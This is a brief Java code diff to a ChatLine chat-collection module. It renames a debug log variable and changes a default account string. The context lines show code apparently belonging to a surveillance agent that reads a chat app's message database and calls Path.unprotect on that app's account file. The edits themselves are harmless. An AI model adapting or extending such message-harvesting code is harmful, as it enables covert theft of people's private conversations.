@@ -31,7 +31,7 @@ public class ChatLine extends SubModuleChat {
 	private long lastLine;
 	Semaphore readChatSemaphore = new Semaphore(1, true);
 
-	private String account = "local";
+	private String account = "";
 	private String account_mid = "mid";
 
 	private GenericSqliteHelper helper;
@@ -65,7 +65,7 @@ public class ChatLine extends SubModuleChat {
 
 			lastLine = markup.unserialize(new Long(0));
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (start), read lastSkype: " + lastLine);
+				Check.log(TAG + " (start), read lastLine: " + lastLine);
 			}
 
 			Path.unprotect(dbAccountFile, 3, true);
